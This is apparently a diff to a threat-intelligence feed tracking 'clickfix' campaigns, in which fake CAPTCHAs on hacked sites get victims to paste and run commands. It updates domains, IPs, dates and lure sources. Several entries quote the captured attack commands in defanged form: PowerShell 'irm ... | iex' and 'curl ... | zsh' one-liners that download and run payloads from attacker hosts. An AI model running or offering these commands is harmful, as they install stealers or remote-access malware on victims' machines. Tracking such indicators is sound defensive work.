@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 5764,
+ "count": 5762,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -48,9 +48,11 @@
    "actor": null,
    "actor_link": null,
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex",
     "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -3866,7 +3868,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -7020,7 +7023,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -17588,7 +17592,8 @@
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "browse-nnccodes.beer"
+    "browse-nnccodes.beer",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -25966,11 +25971,12 @@
    "commands": [
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "t-trustrest.com",
     "trek-72.com",
+    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -38145,7 +38151,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -39753,17 +39760,20 @@
    "actor_link": null,
    "commands": [
     "irm 'id-verfied.boats/[id]'|iex;",
+    "irm 'sotonteoojrvd[.]xzx1[.]com/s/w/1' | iex",
     "irm 'ncheck-brows[.]beer/[id]'|iex"
    ],
    "connects_to": [
     "id-verfied.boats",
+    "sotonteoojrvd.xzx1.com",
     "ncheck-brows.beer"
    ],
    "lure_from": [
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -80122,63 +80132,6 @@
    "lure_from": []
   },
   {
-   "indicator": "daewoopowerproducts.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-29",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-11-20",
-   "offline_since": null,
-   "url": "https://daewoopowerproducts.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "DigitalOcean",
-   "dns": "hostmar.com",
-   "ip": "134.209.127.17",
-   "asn": "AS14061",
-   "org": "DigitalOcean, LLC",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "134.209.127.17",
-     "asn": "AS14061",
-     "org": "DigitalOcean, LLC",
-     "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "daewoopowerproducts.com",
-     "status": "online",
-     "first_seen": "2026-10-29",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex"
-   ],
-   "connects_to": [
-    "hagosuro.lc",
-    "xorados.com",
-    "trek-72.com",
-    "t-trustrest.com",
-    "t-trustresnew.com",
-    "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "dailq.com",
    "type": "domain",
    "category": "clickfix",
@@ -114644,7 +114597,8 @@
     "lovezramexar.info",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -141734,20 +141688,20 @@
    "actor": null,
    "actor_link": null,
    "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
+    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
    ],
    "connects_to": [
     "xorados.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "trek-72.com",
     "groverudder12.com",
     "github.pw",
+    "j7tracker.gb.net",
     "entitlementcheck.pro",
-    "t-trustresnew.com",
-    "45.158.199.240"
+    "t-trustresnew.com"
    ],
    "lure_from": [
     "interseq.at",
@@ -149210,7 +149164,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.71.185",
+   "ip": "2606:4700:3035::ac43:9410",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -163869,12 +163823,12 @@
    "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
-   "url": "https://staging-everythingrhythmicgymnasticscom.kinsta.cloud/",
+   "url": "https://stg-hamiltonjankecomau-hamjankestg.kinsta.cloud/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "162.159.135.42",
+   "ip": "162.159.134.42",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": "US",
@@ -198539,10 +198493,10 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-25",
-   "last_seen": "2026-11-19",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-20",
    "offline_since": null,
-   "url": "https://227311.us12.myftpupload.com/",
+   "url": "https://147816.us6.myftpupload.com/",
    "brand": null,
    "product": null,
    "hosting": "Cloudflare (proxied)",
@@ -198557,7 +198511,7 @@
      "asn": "AS209242",
      "org": "CLOUDFLARESPECTRUM Cloudflare London, LLC, US",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-11-19"
+     "last_seen": "2026-11-20"
     }
    ],
    "hosts": [
@@ -198572,6 +198526,12 @@
      "status": "online",
      "first_seen": "2026-10-26",
      "last_seen": "2026-11-06"
+    },
+    {
+     "host": "147816.us6.myftpupload.com",
+     "status": "unknown",
+     "first_seen": "2026-11-20",
+     "last_seen": "2026-11-20"
     },
     {
      "host": "227311.us12.myftpupload.com",
@@ -202045,7 +202005,8 @@
     "id-verfied.boats",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -207343,6 +207304,8 @@
     "fudcomcheck.art",
     "webffoo001.cc",
     "webffoo002.cc",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fcdnbovres.cc"
    ]
   },
@@ -213873,7 +213836,7 @@
    "role": "Redirector",
    "status": "offline",
    "first_seen": "2026-11-17",
-   "last_seen": "2026-11-17",
+   "last_seen": "2026-11-20",
    "last_online": "2026-11-19",
    "offline_since": "2026-11-19",
    "url": "https://pedeumgiro.com.br/",
@@ -215290,7 +215253,8 @@
    "lure_from": [
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -270170,7 +270134,8 @@
     "ssns-cdn-ns.beer",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
@@ -277366,60 +277331,6 @@
    "lure_from": [
     "biboiboboorl.org",
     "interseq.at"
-   ]
-  },
-  {
-   "indicator": "theconfidentcareer.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-25",
-   "last_seen": "2026-10-26",
-   "last_online": "2026-11-20",
-   "offline_since": null,
-   "url": "https://theconfidentcareer.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "TierPoint",
-   "dns": "Enom / Tucows",
-   "ip": "68.168.84.191",
-   "asn": "AS17378",
-   "org": "TierPoint, LLC",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "68.168.84.191",
-     "asn": "AS17378",
-     "org": "TierPoint, LLC",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "theconfidentcareer.com",
-     "status": "online",
-     "first_seen": "2026-10-25",
-     "last_seen": "2026-10-26"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm 'id-verfied.boats/[id]'|iex;",
-    "irm 'ncheck-brows[.]beer/[id]'|iex"
-   ],
-   "connects_to": [
-    "id-verfied.boats",
-    "ncheck-brows.beer"
-   ],
-   "lure_from": [
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer",
-    "jjjducodes.beer"
    ]
   },
   {
@@ -289887,6 +289798,8 @@
     "fudcomcheck.art",
     "webffoo001.cc",
     "webffoo002.cc",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc",
     "fcdnbovres.cc"
    ]
   },
@@ -309525,7 +309438,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "jjjducodes.beer",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "img-codes-cloude.info"
    ]
   },
   {
